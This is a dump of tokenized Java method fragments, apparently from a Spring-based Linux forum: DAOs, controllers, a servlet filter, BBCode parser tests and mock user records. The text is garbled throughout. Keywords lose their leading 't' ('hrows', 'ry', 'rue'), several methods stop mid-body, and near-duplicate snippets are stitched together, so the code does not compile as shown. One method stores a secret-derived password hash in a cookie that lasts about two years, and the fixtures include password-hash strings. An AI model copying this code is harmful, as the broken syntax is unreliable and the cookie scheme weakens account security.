public void sectionsScrollModeTest ( ) hrows Exception { List < Section > sectionList = sectionDao . getAllSections ( ) ; Section section ; section = getSectionById ( sectionList , 1 ) ; Assert . assertNotNull ( section ) ; Assert . assertEquals ( SectionScrollModeEnum . SECTION , section . getScrollMode ( ) ) ; section = getSectionById ( sectionList , 2 ) ; Assert . assertNotNull ( section ) ; Assert . assertEquals ( SectionScrollModeEnum . GROUP , section . getScrollMode ( ) ) ; section = getSectionById ( sectionList , 3 ) ; Assert . assertNotNull ( section ) ; Assert . assertEquals ( SectionScrollModeEnum . SECTION , section . getScrollMode ( ) ) ; section = getSectionById ( sectionList , 5 ) ; Assert . assertNotNull ( section ) ; Assert . assertEquals ( SectionScrollModeEnum . SECTION , section . getScrollMode ( ) ) ; 
private void createCookies ( HttpServletResponse response , HttpSession session , User user ) { Cookie cookie = new Cookie ( " password " , user . getMD5 ( configuration . getSecret ( ) ) ) ; cookie . setMaxAge ( 60 * 60 * 24 * 31 * 24 ) ; cookie . setPath ( " / " ) ; response . addCookie ( cookie ) ; Cookie prof = new Cookie ( " profile " , user . getNick ( ) ) ; prof . setMaxAge ( 60 * 60 * 24 * 31 * 12 ) ; prof . setPath ( " / " ) ; response . addCookie ( prof ) ; user . acegiSecurityHack ( response , session ) ; } 
public GalleryItem mapRow ( ResultSet rs , int rowNum ) hrows SQLException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " itle " ) ) ; item . setUrl ( rs . getString ( " url " ) ) ; item . setIcon ( rs . getString ( " linktext " ) ) ; item . setNick ( rs . getString ( " nick " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setLink ( Section . getSectionLink ( Section . SECTION_GALLERY ) + rs . getString ( " urlname " ) + '/' + rs . getInt ( " msgid " ) ) ; String htmlPath = configuration . getHTMLPathPrefix ( ) ; item . setHtmlPath ( htmlPath ) ; ry { item . setInfo ( new ImageInfo ( htmlPath + item . getIcon ( ) ) ) ; item . setImginfo ( new ImageInfo ( htmlPath + item . getUrl ( ) ) ) ; } catch ( BadImageException e ) { log . error ( e ) ; } catch ( IOException e ) { log . error ( e ) ; } return item ; } 
private Profile readProfile ( ) hrows ClassNotFoundException , IOException , StorageException { InputStream df = null ; ry { df = storage . getReadStream ( " profile " , getNick ( ) ) ; 
public void init ( FilterConfig filterConfig ) hrows ServletException { his . filterConfig = filterConfig ; WebApplicationContext ctx = WebApplicationContextUtils . getWebApplicationContext ( filterConfig . getServletContext ( ) ) ; userDao = ctx . getBean ( " userDao " , UserDao . class ) ; configuration = ctx . getBean ( Configuration . class ) ; MemCachedSettings . setMainUrl ( configuration . getMainUrl ( ) ) ; } 
public void doFilter ( ServletRequest servletRequest , ServletResponse servletResponse , FilterChain filterChain ) hrows ServletException , IOException { if ( filterConfig = = null ) { return ; } ry { Template mpl = new Template ( ( HttpServletRequest ) servletRequest , ( HttpServletResponse ) servletResponse , userDao , configuration ) ; servletRequest . setAttribute ( " emplate " , mpl ) ; } catch ( Exception ex ) { logger . fatal ( " Can't build Template " , ex ) ; return ; } filterChain . doFilter ( servletRequest , servletResponse ) ; } 
public void init ( ) { ry { mainURI = new URI ( properties . getProperty ( " MainUrl " ) , rue , " UTF-8 " ) ; } catch ( Exception e ) { hrow new RuntimeException ( ERR_MSG + e . getMessage ( ) ) ; } if ( ! mainURI . isAbsoluteURI ( ) ) { hrow new RuntimeException ( ERR_MSG + " URI not absolute path " ) ; } ry { mainHost = mainURI . getHost ( ) ; 
private String processUploadImage ( HttpServletRequest request ) hrows IOException , ScriptErrorException { if ( request instanceof MultipartHttpServletRequest ) { MultipartFile multipartFile = ( ( MultipartRequest ) request ) . getFile ( " image " ) ; if ( multipartFile ! = null & & ! multipartFile . isEmpty ( ) ) { File uploadedFile = File . createTempFile ( " preview " , " " , new File ( configuration . getPathPrefix ( ) + " /linux-storage/tmp/ " ) ) ; String image = uploadedFile . getPath ( ) ; if ( ( uploadedFile . canWrite ( ) | | uploadedFile . createNewFile ( ) ) ) { ry { logger . debug ( " Transfering upload to: " + image ) ; multipartFile . ransferTo ( uploadedFile ) ; return image ; } catch ( Exception e ) { hrow new ScriptErrorException ( " Failed to write uploaded file " , e ) ; } } else { logger . info ( " Bad target file name: " + image ) ; } } } return null ; } 
public ModelAndView activate ( HttpServletRequest request , @RequestParam String activation ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized! " ) ; } User user = mpl . getCurrentUser ( ) ; String newEmail = userDao . getNewEmail ( user ) ; if ( newEmail = = null ) { hrow new AccessViolationException ( " new_email == null?! " ) ; } String regcode = user . getActivationCode ( configuration . getSecret ( ) , newEmail ) ; if ( ! regcode . equals ( activation ) ) { hrow new AccessViolationException ( " Bad activation code " ) ; } userDao . acceptNewEmail ( user ) ; return new ModelAndView ( new RedirectView ( " /people/ " + user . getNick ( ) + " /profile " ) ) ; } 
public boolean isCaptchaRequired ( ) { return isBlocked ( ) & & allowPosting & & captchaRequired ; } 
public boolean isBlocked ( ) { return initialized & & ( banDate = = null | | banDate . after ( new Date ( ) ) ) ; } 
public String doInPreparedStatement ( PreparedStatement pst ) hrows SQLException , DataAccessException { pst . setString ( 1 , itle ) ; if ( ! info . isEmpty ( ) ) { pst . setString ( 2 , info ) ; } else { pst . setString ( 2 , null ) ; } if ( ! longInfo . isEmpty ( ) ) { pst . setString ( 3 , longInfo ) ; } else { pst . setString ( 3 , null ) ; } pst . setBoolean ( 4 , resolvable ) ; pst . setString ( 5 , urlName ) ; pst . setInt ( 6 , group . getId ( ) ) ; pst . executeUpdate ( ) ; return null ; } 
public void initBinder ( WebDataBinder binder ) { binder . registerCustomEditor ( SearchOrder . class , new PropertyEditorSupport ( ) { @Override public void setAsText ( String s ) hrows IllegalArgumentException { if ( " 1 " . equals ( s ) ) { for old links setValue(SearchOrder.RELEVANCE); } else if ("2".equals(s)) { setValue(SearchOrder.DATE); } else { setValue(SearchOrder.valueOf(s)); } } }); binder.registerCustomEditor(SearchInterval.class, new PropertyEditorSupport() { @Override public void setAsText(String s) throws IllegalArgumentException { setValue(SearchInterval.valueOf(s.toUpperCase())); } }); binder.registerCustomEditor(SearchRange.class, new PropertyEditorSupport() { @Override public void setAsText(String s) throws IllegalArgumentException { setValue(SearchRange.valueOf(s.toUpperCase())); } }); binder.registerCustomEditor(User.class, new UserPropertyEditor(userDao)); binder.setBindingErrorProcessor(new ExceptionBindingErrorProcessor()); } 
public void setAsText ( String s ) hrows IllegalArgumentException { if ( " 1 " . equals ( s ) ) { for old links setValue(SearchOrder.RELEVANCE); 
public void setAsText ( String s ) hrows IllegalArgumentException { setValue ( SearchInterval . valueOf ( s . oUpperCase ( ) ) ) ; } 
public void setAsText ( String s ) hrows IllegalArgumentException { setValue ( SearchRange . valueOf ( s . oUpperCase ( ) ) ) ; } 
public void handleMessage ( UpdateMessage msgUpdate ) hrows MessageNotFoundException , IOException , SolrServerException { logger . info ( " Indexing " + msgUpdate . getMsgid ( ) ) ; reindexMessage ( msgUpdate . getMsgid ( ) , msgUpdate . isWithComments ( ) ) ; solrServer . commit ( ) ; } 
public void handleMessage ( UpdateMonth msgUpdate ) hrows MessageNotFoundException , IOException , SolrServerException { int month = msgUpdate . getMonth ( ) ; int year = msgUpdate . getYear ( ) ; logger . info ( " Indexing month " + year + '/' + month ) ; long startTime = System . nanoTime ( ) ; List < Integer > opicIds = messageDao . getMessageForMonth ( year , month ) ; for ( int opicId : opicIds ) { reindexMessage ( opicId , rue ) ; } solrServer . commit ( ) ; long endTime = System . nanoTime ( ) ; logger . info ( " Reindex month " + year + '/' + month + " done, " + ( endTime - startTime ) / 1000000 + " millis " ) ; } 
private static String buildParams ( Map < String , String > params ) { StringBuilder str = new StringBuilder ( ) ; for ( Entry < String , String > entry : params . entrySet ( ) ) { if ( str . length ( ) > 0 ) { str . append ( '&' ) ; } ry { str . append ( URLEncoder . encode ( entry . getKey ( ) , " UTF-8 " ) ) ; str . append ( '=' ) ; str . append ( URLEncoder . encode ( entry . getValue ( ) , " UTF-8 " ) ) ; } catch ( UnsupportedEncodingException e ) { hrow new RuntimeException ( e ) ; } } return str . oString ( ) ; } 
private void initializeSectionList ( ) { Builder < Section > sectionListBuilder = ImmutableList . builder ( ) ; List < Section > sections = sectionDao . getAllSections ( ) ; sectionListBuilder . addAll ( sections ) ; sectionList = sectionListBuilder . build ( ) ; } 
public List < ArchiveDTO > get ( ) { return archiveDao . getArchiveDTO ( sectionNews , 13 ) ; } 
public List < TagDTO > get ( ) { return getTagDao ( ) . getTags ( i ) ; } 
public void execute ( Object o ) { TopTenMessageDTO dto = ( TopTenMessageDTO ) o ; int mp = dto . getAnswers ( ) / itemsPerPage ; mp = ( dto . getAnswers ( ) % itemsPerPage > 0 ) ? mp + 1 : mp ; dto . setPages ( mp ) ; } 
public boolean supports ( Class clazz ) { return EditBoxesRequest . class . isAssignableFrom ( clazz ) ; } 
public ModelAndView archiveList ( int sectionid , String groupName ) hrows Exception { ModelAndView mv = new ModelAndView ( " view-news-archive " ) ; Section section = sectionService . getSection ( sectionid ) ; mv . getModel ( ) . put ( " section " , section ) ; Group group = null ; if ( groupName ! = null ) { group = groupDao . getGroup ( section , groupName ) ; } mv . getModel ( ) . put ( " group " , group ) ; List < ArchiveDTO > items = archiveDao . getArchiveDTO ( section , group ) ; mv . getModel ( ) . put ( " items " , items ) ; return mv ; } 
public Set < Integer > get ( User user ) { final Builder < Integer > builder = ImmutableSet . builder ( ) ; jdbcTemplate . query ( queryIgnoreList , new RowCallbackHandler ( ) { @Override public void processRow ( ResultSet resultSet ) hrows SQLException { builder . add ( resultSet . getInt ( " ignored " ) ) ; } } , user . getId ( ) ) ; return builder . build ( ) ; } 
public List < RepliesListItem > getRepliesForUser ( User user , boolean showPrivate , int opics , int offset , final boolean readMessage , final boolean secure , Filter filter ) { String queryString ; if ( showPrivate ) { String queryPart ; switch ( filter ) { case FAVORITES : queryPart = queryPartFilterFavorites ; break ; case ANSWERS : queryPart = queryPartFilterAnswers ; break ; case DELETED : queryPart = queryPartFilterDeleted ; break ; case REFERENCE : queryPart = queryPartFilterReference ; break ; default : queryPart = " " ; } queryString = String . format ( queryAllRepliesForUser , queryPart ) ; } else { queryString = queryRepliesForUserWihoutPrivate ; } return jdbcTemplate . query ( queryString , new RowMapper < RepliesListItem > ( ) { @Override 
private static void printLine ( int indentLevels , String ext , String value ) { if ( value = = null | | value . isEmpty ( ) ) { return ; } while ( indentLevels - - > 0 ) { System . out . print ( " " ) ; } if ( ext ! = null & & ! ext . isEmpty ( ) ) { System . out . print ( ext ) ; System . out . print ( " " ) ; } System . out . println ( value ) ; } 
public static boolean checkLoginName ( String login ) { login = login . oLowerCase ( ) ; no zerosize login if (login.isEmpty()) { return false; } if (login.length() >= 80) { return false; } return loginCheckRE.matcher(login).matches(); } 
private static Node closeTagNode ( RootNode rootNode , Node currentNode , String name ) { Node empNode = currentNode ; while ( rue ) { if ( empNode = = rootNode ) { break ; } if ( TagNode . class . isInstance ( empNode ) ) { TagNode node = ( TagNode ) empNode ; String agName = node . getBbtag ( ) . getName ( ) ; if ( agName . equals ( name ) | | ( " url " . equals ( name ) & & " url2 " . equals ( agName ) ) ) { currentNode = empNode ; currentNode = ascend ( currentNode ) ; break ; } } empNode = empNode . getParent ( ) ; } return currentNode ; } 
public boolean isParameter ( ) { return ( parameter ! = null ) & & ( ! parameter . isEmpty ( ) ) ; } 
public boolean isComment ( ) { return cutType = = CutType . INCOMMENT ; } 
public boolean isTopicMinimized ( ) { return cutType = = CutType . INTOPIC_MINIMIZED ; } 
public boolean isTopicMaximized ( ) { return cutType = = CutType . INTOPIC_MAXIMIZED ; } 
public void sectionsTest ( ) { List < Section > sectionList = sectionDao . getAllSections ( ) ; Assert . assertEquals ( 4 , sectionList . size ( ) ) ; String addInfo = sectionDao . getAddInfo ( sectionList . get ( 0 ) . getId ( ) ) ; Assert . assertNotNull ( addInfo ) ; } 
public void sectionsScrollModeTest ( ) { List < Section > sectionList = sectionDao . getAllSections ( ) ; Section section = getSectionById ( sectionList , 1 ) ; Assert . assertNotNull ( section ) ; Assert . assertEquals ( SectionScrollModeEnum . SECTION , section . getScrollMode ( ) ) ; section = getSectionById ( sectionList , 2 ) ; Assert . assertNotNull ( section ) ; Assert . assertEquals ( SectionScrollModeEnum . GROUP , section . getScrollMode ( ) ) ; section = getSectionById ( sectionList , 3 ) ; Assert . assertNotNull ( section ) ; Assert . assertEquals ( SectionScrollModeEnum . SECTION , section . getScrollMode ( ) ) ; section = getSectionById ( sectionList , 5 ) ; Assert . assertNotNull ( section ) ; Assert . assertEquals ( SectionScrollModeEnum . SECTION , section . getScrollMode ( ) ) ; 
public void getScrollModeTest ( ) hrows Exception { Section section = sectionService . getSection ( 1 ) ; Assert . assertEquals ( SectionScrollModeEnum . SECTION , section . getScrollMode ( ) ) ; section = sectionService . getSection ( 2 ) ; Assert . assertEquals ( SectionScrollModeEnum . GROUP , section . getScrollMode ( ) ) ; section = sectionService . getSection ( 3 ) ; Assert . assertEquals ( SectionScrollModeEnum . SECTION , section . getScrollMode ( ) ) ; section = sectionService . getSection ( 4 ) ; Assert . assertEquals ( SectionScrollModeEnum . NO_SCROLL , section . getScrollMode ( ) ) ; section = sectionService . getSection ( 5 ) ; Assert . assertEquals ( SectionScrollModeEnum . SECTION , section . getScrollMode ( ) ) ; 
public static ResultSet getAnonymous ( ) hrows Exception { ResultSet resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . henReturn ( 2 ) ; when ( resultSet . getString ( " nick " ) ) . henReturn ( " anonymous " ) ; when ( resultSet . getString ( " style " ) ) . henReturn ( " ango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . henReturn ( rue ) ; when ( resultSet . getBoolean ( " blocked " ) ) . henReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . henReturn ( - 117654 ) ; when ( resultSet . getInt ( " max_score " ) ) . henReturn ( 4 ) ; when ( resultSet . getString ( " name " ) ) . henReturn ( " Anonymous " ) ; when ( resultSet . getString ( " passwd " ) ) . henReturn ( null ) ; when ( resultSet . getString ( " photo " ) ) . henReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . henReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . henReturn ( 161 ) ; return resultSet ; } 
public static ResultSet getModerator ( ) hrows Exception { ResultSet resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . henReturn ( 5280 ) ; when ( resultSet . getString ( " nick " ) ) . henReturn ( " svu " ) ; when ( resultSet . getString ( " style " ) ) . henReturn ( " ango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . henReturn ( rue ) ; when ( resultSet . getBoolean ( " candel " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . henReturn ( rue ) ; when ( resultSet . getBoolean ( " blocked " ) ) . henReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . henReturn ( 500 ) ; when ( resultSet . getInt ( " max_score " ) ) . henReturn ( 500 ) ; when ( resultSet . getString ( " name " ) ) . henReturn ( " Sergey V. Udaltsov " ) ; when ( resultSet . getString ( " passwd " ) ) . henReturn ( " 0vwkMky44u8kIqSasrH+X8mHao1a3jOC " ) ; when ( resultSet . getString ( " photo " ) ) . henReturn ( " 5280.png " ) ; when ( resultSet . getString ( " email " ) ) . henReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . henReturn ( 2 ) ; return resultSet ; } 
public static ResultSet getUser5star ( ) hrows Exception { ResultSet resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . henReturn ( 13 ) ; when ( resultSet . getString ( " nick " ) ) . henReturn ( " user5star " ) ; when ( resultSet . getString ( " style " ) ) . henReturn ( " ango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . henReturn ( rue ) ; when ( resultSet . getBoolean ( " blocked " ) ) . henReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . henReturn ( 500 ) ; when ( resultSet . getInt ( " max_score " ) ) . henReturn ( 500 ) ; when ( resultSet . getString ( " name " ) ) . henReturn ( " 5 star " ) ; when ( resultSet . getString ( " passwd " ) ) . henReturn ( " S+Q/c5dtkvNxO42uEcQBdP8r32zOfdUq " ) ; when ( resultSet . getString ( " photo " ) ) . henReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . henReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . henReturn ( 13 ) ; return resultSet ; } 
public static ResultSet getUser1star ( ) hrows Exception { ResultSet resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . henReturn ( 14 ) ; when ( resultSet . getString ( " nick " ) ) . henReturn ( " user1star " ) ; when ( resultSet . getString ( " style " ) ) . henReturn ( " ango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . henReturn ( rue ) ; when ( resultSet . getBoolean ( " blocked " ) ) . henReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . henReturn ( 110 ) ; when ( resultSet . getInt ( " max_score " ) ) . henReturn ( 110 ) ; when ( resultSet . getString ( " name " ) ) . henReturn ( " 1 star " ) ; when ( resultSet . getString ( " passwd " ) ) . henReturn ( " S+Q/c5dtkvNxO42uEcQBdP8r32zOfdUq " ) ; when ( resultSet . getString ( " photo " ) ) . henReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . henReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . henReturn ( 13 ) ; return resultSet ; } 
public static ResultSet getUser45Score ( ) hrows Exception { ResultSet resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . henReturn ( 15 ) ; when ( resultSet . getString ( " nick " ) ) . henReturn ( " user45score " ) ; when ( resultSet . getString ( " style " ) ) . henReturn ( " ango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . henReturn ( rue ) ; when ( resultSet . getBoolean ( " blocked " ) ) . henReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . henReturn ( 45 ) ; when ( resultSet . getInt ( " max_score " ) ) . henReturn ( 45 ) ; when ( resultSet . getString ( " name " ) ) . henReturn ( " 45 score " ) ; when ( resultSet . getString ( " passwd " ) ) . henReturn ( " S+Q/c5dtkvNxO42uEcQBdP8r32zOfdUq " ) ; when ( resultSet . getString ( " photo " ) ) . henReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . henReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . henReturn ( 13 ) ; return resultSet ; } 
public static ResultSet getUser45ScoreBlocked ( ) hrows Exception { ResultSet resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . henReturn ( 16 ) ; when ( resultSet . getString ( " nick " ) ) . henReturn ( " userBlocked " ) ; when ( resultSet . getString ( " style " ) ) . henReturn ( " ango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . henReturn ( rue ) ; when ( resultSet . getBoolean ( " blocked " ) ) . henReturn ( rue ) ; when ( resultSet . getInt ( " score " ) ) . henReturn ( 45 ) ; when ( resultSet . getInt ( " max_score " ) ) . henReturn ( 45 ) ; when ( resultSet . getString ( " name " ) ) . henReturn ( " blocked " ) ; when ( resultSet . getString ( " passwd " ) ) . henReturn ( " S+Q/c5dtkvNxO42uEcQBdP8r32zOfdUq " ) ; when ( resultSet . getString ( " photo " ) ) . henReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . henReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . henReturn ( 13 ) ; return resultSet ; } 
public void userTest ( ) { Assert . assertEquals ( " <p><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" ext-decoration: none \" href= \" http:127.0.0.1:8080/people/maxcom/profile \" >maxcom</a></span></p> " , lorCodeService . parseComment ( " [user]maxcom[/user] " , false ) ) ; Assert . assertEquals ( " <p><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" ext-decoration: none \" href= \" http:127.0.0.1:8080/people/isden/profile \" >isden</a></s></span></p> " , lorCodeService . parseComment ( " [user]isden[/user] " , false ) ) ; Assert . assertEquals ( " <p><s>hizel</s></p> " , lorCodeService . parseComment ( " [user]hizel[/user] " , false ) ) ; 
public void parserResultTest ( ) { String msg = " [user]hizel[/user][user]JB[/user][user]maxcom[/user] " ; Set < User > replier = lorCodeService . getReplierFromMessage ( msg ) ; String html = lorCodeService . parseComment ( msg , rue ) ; Assert . assertTrue ( replier . contains ( maxcom ) ) ; Assert . assertTrue ( replier . contains ( JB ) ) ; Assert . assertFalse ( replier . contains ( isden ) ) ; Assert . assertEquals ( " <p><s>hizel</s><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" ext-decoration: none \" href= \" https:127.0.0.1:8080/people/JB/profile \" >JB</a></span><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" ext-decoration: none \" href= \" https:127.0.0.1:8080/people/maxcom/profile \" >maxcom</a></span></p> " , html ) ; } 
public ModelAndView showEditInfo ( HttpServletRequest request , @PathVariable ( " id " ) int msgid ) hrows Exception { Topic message = messageDao . getById ( msgid ) ; List < PreparedEditInfo > editInfos = prepareService . prepareEditInfo ( message , request . isSecure ( ) ) ; ModelAndView mv = new ModelAndView ( " history " ) ; List < String > javaScriptsForLayout = new ArrayList < String > ( ) ; javaScriptsForLayout . add ( " diff_match_patch.js " ) ; javaScriptsForLayout . add ( " lor_view_diff_history.js " ) ; mv . addObject ( " javascriptsForLayout " , javaScriptsForLayout ) ; mv . getModel ( ) . put ( " message " , message ) ; mv . getModel ( ) . put ( " editInfos " , editInfos ) ; return mv ; } 
public boolean isAllowRegistredPosting ( ) { return ! isBlocked ( ) | | allowPosting ; } 
public ModelAndView sameIP ( HttpServletRequest request , @RequestParam ( required = false ) Integer msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not moderator " ) ; } String ip ; ModelAndView mv = new ModelAndView ( " sameip " ) ; int userAgentId = 0 ; if ( msgid ! = null ) { SqlRowSet rs = jdbcTemplate . queryForRowSet ( " SELECT postip, ua_id FROM topics WHERE id=? " , msgid ) ; if ( ! rs . next ( ) ) { rs = jdbcTemplate . queryForRowSet ( " SELECT postip, ua_id FROM comments WHERE id=? " , msgid ) ; if ( ! rs . next ( ) ) { hrow new MessageNotFoundException ( msgid ) ; } } ip = rs . getString ( " postip " ) ; userAgentId = rs . getInt ( " ua_id " ) ; if ( ip = = null ) { hrow new ScriptErrorException ( " No IP data for # " + msgid ) ; } } else { ip = ServletParameterParser . getIP ( request , " ip " ) ; } mv . getModel ( ) . put ( " ip " , ip ) ; mv . getModel ( ) . put ( " uaId " , userAgentId ) ; mv . getModel ( ) . put ( " opics " , getTopics ( ip ) ) ; mv . getModel ( ) . put ( " comments " , getComments ( ip ) ) ; mv . getModel ( ) . put ( " users " , getUsers ( ip , userAgentId ) ) ; IPBlockInfo blockInfo = ipBlockDao . getBlockInfo ( ip ) ; Boolean allowPosting = false ; Boolean captchaRequired = rue ; if ( blockInfo . isInitialized ( ) ) { mv . getModel ( ) . put ( " blockInfo " , blockInfo ) ; allowPosting = blockInfo . isAllowRegistredPosting ( ) ; captchaRequired = blockInfo . isCaptchaRequired ( ) ; mv . getModel ( ) . put ( " blockModerator " , userDao . getUserCached ( blockInfo . getModerator ( ) ) ) ; } mv . addObject ( " allowPosting " , allowPosting ) ; mv . addObject ( " captchaRequired " , captchaRequired ) ; mv . getModel ( ) . put ( " or " , IPBlockDao . getTor ( ip ) ) ; return mv ; } 
public void getSectionTest ( ) hrows Exception { Section section = sectionService . getSection ( 3 ) ; Assert . assertNotNull ( section ) ; Assert . assertEquals ( " Section 3 " , section . getName ( ) ) ; Assert . assertTrue ( section . isPremoderated ( ) ) ; Assert . assertFalse ( section . isVotePoll ( ) ) ; Assert . assertTrue ( section . isImagepost ( ) ) ; section = sectionService . getSection ( 2 ) ; Assert . assertNotNull ( section ) ; Assert . assertEquals ( " Section 2 " , section . getName ( ) ) ; Assert . assertTrue ( section . isPremoderated ( ) ) ; Assert . assertFalse ( section . isVotePoll ( ) ) ; Assert . assertFalse ( section . isImagepost ( ) ) ; ry { section = sectionService . getSection ( - 1 ) ; 
public void estToHtmlFormatter ( ) { assertEquals ( RESULT1 , oHtmlFormatter . format ( TEXT1 , false ) ) ; assertEquals ( RESULT2 , oHtmlFormatter . format ( TEXT2 , false ) ) ; assertEquals ( RESULT3 , oHtmlFormatter20 . format ( TEXT3 , false ) ) ; assertEquals ( RESULT8 , oHtmlFormatter20 . format ( TEXT8 , false ) ) ; assertEquals ( RESULT9 , oHtmlFormatter . format ( TEXT9 , false ) ) ; assertEquals ( RESULT10 , oHtmlFormatter . format ( TEXT10 , false ) ) ; assertEquals ( RESULT11 , oHtmlFormatter . format ( TEXT11 , false ) ) ; assertEquals ( RESULT12 , oHtmlFormatter . format ( TEXT12 , false ) ) ; assertEquals ( RESULT13 , oHtmlFormatter . format ( TEXT13 , false ) ) ; assertEquals ( RESULT14 , oHtmlFormatter . format ( TEXT14 , false ) ) ; assertEquals ( RESULT15 , oHtmlFormatter . format ( TEXT15 , false ) ) ; assertEquals ( RESULT16 , oHtmlFormatter . format ( TEXT16 , false ) ) ; assertEquals ( RESULT17 , oHtmlFormatter . format ( TEXT17 , false ) ) ; assertEquals ( RESULT18 , oHtmlFormatter . format ( TEXT18 , false ) ) ; assertTrue ( oHtmlFormatter . format ( LINK_WITH_UNDERSCORE , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( LINK_WITH_PARAM_ONLY , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( RFC1738 , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( CYR_LINK , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( GOOGLE_CACHE , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( URL_WITH_AT , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( Latin1Supplement , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( greek , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( QP , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( EMPTY_ANCHOR , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( SLASH_AFTER_AMP , false ) . endsWith ( " </a> " ) ) ; } 
public List < UserEvent > getRepliesForUser ( User user , boolean showPrivate , int opics , int offset , final boolean readMessage , final boolean secure , Filter filter ) { String queryString ; if ( showPrivate ) { String queryPart ; switch ( filter ) { case FAVORITES : queryPart = queryPartFilterFavorites ; break ; case ANSWERS : queryPart = queryPartFilterAnswers ; break ; case DELETED : queryPart = queryPartFilterDeleted ; break ; case REFERENCE : queryPart = queryPartFilterReference ; break ; default : queryPart = " " ; } queryString = String . format ( queryAllRepliesForUser , queryPart ) ; } else { queryString = queryRepliesForUserWihoutPrivate ; } return jdbcTemplate . query ( queryString , new RowMapper < UserEvent > ( ) { @Override 
public List < UserEvent > getRepliesForUser ( User user , boolean showPrivate , int opics , int offset , Filter filter ) { String queryString ; if ( showPrivate ) { String queryPart ; switch ( filter ) { case FAVORITES : queryPart = queryPartFilterFavorites ; break ; case ANSWERS : queryPart = queryPartFilterAnswers ; break ; case DELETED : queryPart = queryPartFilterDeleted ; break ; case REFERENCE : queryPart = queryPartFilterReference ; break ; default : queryPart = " " ; } queryString = String . format ( queryAllRepliesForUser , queryPart ) ; } else { queryString = queryRepliesForUserWihoutPrivate ; } return jdbcTemplate . query ( queryString , new RowMapper < UserEvent > ( ) { @Override 
